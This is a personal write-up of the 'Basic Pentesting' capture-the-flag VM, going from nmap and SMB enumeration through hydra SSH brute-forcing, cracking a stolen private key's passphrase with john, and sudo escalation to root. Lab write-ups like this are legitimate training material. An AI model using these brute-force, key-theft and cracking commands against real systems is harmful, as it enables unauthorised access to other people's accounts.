# Basic Pentesting

A crack-brute force heavy VM. Took longer than expected because I wasn't committing to brute forcing.

## recon

Initial nmap revealed:

```
tarting Nmap 7.80 ( https://nmap.org ) at 2020-04-29 23:40 UTC
Nmap scan report for ip-10-10-48-183.eu-west-1.compute.internal (10.10.48.183)
Host is up (0.00088s latency).
Not shown: 994 closed ports
PORT     STATE SERVICE
22/tcp   open  ssh
80/tcp   open  http
139/tcp  open  netbios-ssn
445/tcp  open  microsoft-ds
8009/tcp open  ajp13
8080/tcp open  http-proxy
MAC Address: 02:70:FE:84:BB:CE (Unknown)

Nmap done: 1 IP address (1 host up) scanned in 0.22 seconds
```

Nikto on the website revealed a /development listable directory, with a couple of text files. One specified 'J' had a weak password. I did a `enum4linix -US <ip>` over the smb shares and got the username 'jan' from a text file. 

## hydra over ssh, enumeration

This step took the longest, mainly because when it didn't complete within minutes I assumed I was doing something wrong and kept quitting out and trying other things. 

`hydra -l jan -P /usr/share/wordlists/rockyou.txt ssh://10.10.48.183`

When I just left the ssh bruteforce, it found the password after maybe fifteen minutes: `armando`

Connecting to the machine as jan over ssh, I looked around for a bit. Downloaded and ran linpeas.sh, but found little of note. I went into the home directories and found that kay, the other user, had a `pass.bak` file I couldn't read but also had the contents of their .ssh folder readable. I used scp to get the private key back to my attacker machine, and tried ssh-ing in with `ssh -i kay_id_rsa kay@10.10.48.183`, however the key had a passphrase on it.

## id_rsa cracking

I was convinced the key was the way in, I just needed to figure out how to crack it. A bit of research showed it could be done with john, via two steps:

First, I convert the key into a john-ready format via: `python /usr/share/john/ssh2john.py kay_id_rsa > kay_idjohn`. Then I cracked it via `john kay_idjohn --wordlist=/usr/share/wordlists/rockyou.txt`

The passphrase turned up almost straight away: `beeswax`

## sudo and victory

I connected to the machine as kay, then tried `sudo -l`. The password on the box wasn't `beeswax` unfortunately, but I remembered from the enumeration above that `pass.bak` was in kay's home folder. Sure enough that contained `heresareallystrongpasswordthatfollowsthepasswordpolicy$$`.

With that and `sudo -l` I got:

```
Matching Defaults entries for kay on basic2:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User kay may run the following commands on basic2:
    (ALL : ALL) ALL
```

So RIP basically. `Sudo -i` made me root, and then the root flag was:

```
Congratulations! You've completed this challenge. There are two ways (that I'm aware of) to gain
a shell, and two ways to privesc. I encourage you to find them all!

If you're in the target audience (newcomers to pentesting), I hope you learned something. A few
takeaways from this challenge should be that every little bit of information you can find can be
valuable, but sometimes you'll need to find several different pieces of information and combine
them to make them useful. Enumeration is key! Also, sometimes it's not as easy as just finding
an obviously outdated, vulnerable service right away with a port scan (unlike the first entry
in this series). Usually you'll have to dig deeper to find things that aren't as obvious, and
therefore might've been overlooked by administrators.

Thanks for taking the time to solve this VM. If you choose to create a writeup, I hope you'll send
me a link! I can be reached at josiah@vt.edu. If you've got questions or feedback, please reach
out to me.

Happy hacking!
```
